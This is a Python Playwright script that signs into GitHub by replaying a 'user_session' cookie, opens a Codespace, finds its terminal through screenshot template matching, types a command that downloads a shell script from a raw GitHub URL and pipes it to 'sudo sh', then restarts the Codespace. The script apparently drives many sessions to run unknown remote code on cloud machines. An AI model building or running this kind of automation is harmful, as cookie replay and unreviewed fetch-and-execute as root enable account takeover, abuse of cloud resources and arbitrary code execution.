import argparse
import sys
import cv2
import numpy as np
from playwright.sync_api import sync_playwright
from ck_params import get_ck

parser = argparse.ArgumentParser()
parser.add_argument("-s", "--session", type=int, required=True)
args = parser.parse_args()
ccok = get_ck(args.session)

# ── colors ──────────────────────────────────────────────────────────────────
C = {
    "reset":  "\033[0m",
    "bold":   "\033[1m",
    "cyan":   "\033[96m",
    "green":  "\033[92m",
    "yellow": "\033[93m",
    "red":    "\033[91m",
    "grey":   "\033[90m",
    "blue":   "\033[94m",
}
SID = f"{C['bold']}{C['cyan']}[S{args.session}]{C['reset']}"

def log(msg, color="reset"):
    print(f"{SID} {C[color]}{msg}{C['reset']}")

log(f"cookie: {ccok}", "grey")

# ── check tracking ───────────────────────────────────────────────────────────
check_counts   = {}   # template_path -> total call count
_last_check_key = [None]  # track last printed template for dot-chaining

def is_found(page, template_path, threshold=0.8):
    try:
        check_counts[template_path] = check_counts.get(template_path, 0) + 1
        n = check_counts[template_path]

        if _last_check_key[0] == template_path:
            # same template repeating → dot in-place, no newline
            print(f"{C['grey']}.{C['reset']}", end="", flush=True)
        else:
            # new template → end previous line then print fresh check line
            if _last_check_key[0] is not None:
                print()  # close previous dot-line
            print(f"{SID} {C['yellow']}[check #{n}]{C['reset']} {C['grey']}{template_path}{C['reset']}", end="", flush=True)
            _last_check_key[0] = template_path

        screenshot = np.frombuffer(page.screenshot(timeout=15000), np.uint8)
        screen = cv2.imdecode(screenshot, cv2.IMREAD_COLOR)
        template = cv2.imread(template_path)
        result = cv2.matchTemplate(screen, template, cv2.TM_CCOEFF_NORMED)
        _, max_val, _, _ = cv2.minMaxLoc(result)
        return max_val >= threshold
    except Exception as e:
        print()  # end dot line
        _last_check_key[0] = None
        log(f"Screenshot failed: {e}", "red")
        return False

def _end_check_line():
    """Call after a check loop ends to close the dot line."""
    if _last_check_key[0] is not None:
        print()
        _last_check_key[0] = None

def wait_until_ready(page, wait_template="src/wait.png", interval=3):
    while is_found(page, wait_template):
        page.wait_for_timeout(interval * 1000)
    _end_check_line()
    log("Codespace is ready!", "green")

def find_and_click(page, template_path, threshold=0.8):
    screenshot = np.frombuffer(page.screenshot(), np.uint8)
    screen = cv2.imdecode(screenshot, cv2.IMREAD_COLOR)
    template = cv2.imread(template_path)
    result = cv2.matchTemplate(screen, template, cv2.TM_CCOEFF_NORMED)
    _, max_val, _, max_loc = cv2.minMaxLoc(result)

    if max_val < threshold:
        raise Exception(f"Template not found (confidence: {max_val:.2f})")

    h, w = template.shape[:2]
    center_x = max_loc[0] + w // 2
    center_y = max_loc[1] + h // 2
    page.mouse.click(center_x, center_y)
    return center_x, center_y


cookies = [
    {
        "name": "user_session",
        "value": ccok,
        "domain": ".github.com",
        "path": "/",
        "httpOnly": True,
        "secure": True,
    },
    {
        "name": "__Host-user_session_same_site",
        "value": ccok,
        "domain": "github.com",
        "path": "/",
        "httpOnly": True,
        "secure": True,
    },
]

with sync_playwright() as p:
    log("[1/7] Launching browser...", "blue")
    browser = p.chromium.launch(headless=False, args=["--start-maximized"])
    context = browser.new_context(no_viewport=True)
    context.set_default_timeout(120000)
    context.set_default_navigation_timeout(120000)
    context.add_cookies(cookies)
    page = context.new_page()

    log("[2/7] Navigating to GitHub Codespaces...", "blue")
    page.goto("https://github.com/codespaces?unpublished=true", timeout=120000)
    page.wait_for_timeout(15000)

    if page.locator("h1.SessionsAuthHeader-module__authFormHeaderTitle__rVSNG").count() > 0:
        input(f"{SID} {C['red']}cookies dead — press Enter to exit{C['reset']}")
        browser.close()
        exit(1)

    log("[2.1/7] Opening codespace in browser...", "blue")
    page.locator("button.Button--iconOnly .octicon-kebab-horizontal").first.click()
    page.wait_for_timeout(15000)
    page.get_by_text("Open in Browser").click()

    new_page = context.wait_for_event("page")
    new_page.wait_for_load_state()
    page.close()
    page = new_page

    while is_found(page, "src/setting_space.png"):
        _end_check_line()
        log("setting_space detected, waiting up to 2 minutes...", "yellow")
        for _ in range(8):
            page.wait_for_timeout(15000)
            if not is_found(page, "src/setting_space.png"):
                break
        _end_check_line()
        if is_found(page, "src/setting_space.png"):
            _end_check_line()
            log("Still stuck, refreshing...", "yellow")
            page.reload()
    _end_check_line()

    while True:
        log("[3/7] Checking if codespace is loading...", "blue")

        # wait for wait.png — update count in-place
        attempt = [0]
        while not is_found(page, "src/wait.png"):
            attempt[0] += 1
            sys.stdout.write(f"\r{SID} {C['yellow']}waiting for wait.png... attempt {attempt[0]}{C['reset']}  ")
            sys.stdout.flush()
            page.wait_for_timeout(15000)
        _end_check_line()
        log("wait.png detected! Codespace is loading...", "green")
        wait_until_ready(page)

        # wait for terminal.png — update count in-place
        attempt[0] = 0
        for _ in range(20):
            if is_found(page, "src/terminal.png"):
                break
            attempt[0] += 1
            sys.stdout.write(f"\r{SID} {C['yellow']}waiting for terminal.png... attempt {attempt[0]}{C['reset']}  ")
            sys.stdout.flush()
            page.wait_for_timeout(15000)
        _end_check_line()
        log("Terminal ready!", "green")

        log("[4/7] Clicking terminal tab...", "blue")
        page.screenshot(path="debug_before_terminal.png")
        try:
            screenshot = np.frombuffer(page.screenshot(), np.uint8)
            screen = cv2.imdecode(screenshot, cv2.IMREAD_COLOR)
            template = cv2.imread("src/terminal.png")
            result = cv2.matchTemplate(screen, template, cv2.TM_CCOEFF_NORMED)
            _, max_val, _, max_loc = cv2.minMaxLoc(result)

            if max_val < 0.6:
                raise Exception(f"Terminal not found (confidence: {max_val:.2f})")

            h, w = template.shape[:2]
            click_x = max_loc[0] + w // 2
            click_y = max_loc[1] + h + 50
            log(f"Clicking at ({click_x}, {click_y})", "grey")
            page.mouse.click(click_x, click_y)
        except Exception as e:
            log(f"Failed to find terminal: {e}", "red")
            log("Check debug_before_terminal.png and compare with src/terminal.png", "yellow")
            browser.close()
            exit(1)
        page.wait_for_timeout(15000)

        log("[5/7] Typing command...", "blue")
        page.keyboard.type("   curl 'https://raw.githubusercontent.com/hasnaouiyacine59-wq/blackbox/refs/heads/master/init_.sh' | sudo sh\n")

        # wait for restart.png — update count in-place
        attempt[0] = 0
        while not is_found(page, "src/restart.png"):
            attempt[0] += 1
            sys.stdout.write(f"\r{SID} {C['yellow']}waiting for restart.png... attempt {attempt[0]}{C['reset']}  ")
            sys.stdout.flush()
            page.wait_for_timeout(15000)
        _end_check_line()
        log("Restart detected! Clicking restart...", "green")
        find_and_click(page, "src/restart.png")
        page.wait_for_timeout(15000)
